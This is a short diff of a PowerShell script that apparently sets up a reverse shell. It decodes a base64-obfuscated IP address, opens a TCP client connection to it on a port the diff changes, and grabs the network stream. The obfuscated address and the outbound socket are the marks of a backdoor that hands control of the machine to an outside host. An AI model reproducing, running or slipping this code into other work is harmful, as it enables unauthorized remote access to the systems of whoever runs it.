@@ -9,7 +9,7 @@ try {
     
     
     $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
-    $port = 58475;
+    $port = 53051;
 
     $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
     $NetworkStream = $TCPClient.GetStream();
